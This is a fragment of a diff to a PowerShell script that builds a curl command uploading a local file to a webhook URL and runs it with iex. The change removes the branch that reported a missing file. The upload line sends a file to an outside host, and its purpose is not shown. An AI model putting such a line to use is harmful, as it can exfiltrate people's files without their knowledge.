@@ -11,6 +11,4 @@ if (Test-Path $filePath) {
     # Execute the curl command to upload the file
     $curlCommand = "curl -F `""file=@$filePath`"" `"$webhookUrl`""
     iex $curlCommand
-} else {
-    Write-Host "File not found at path: $filePath"
 }
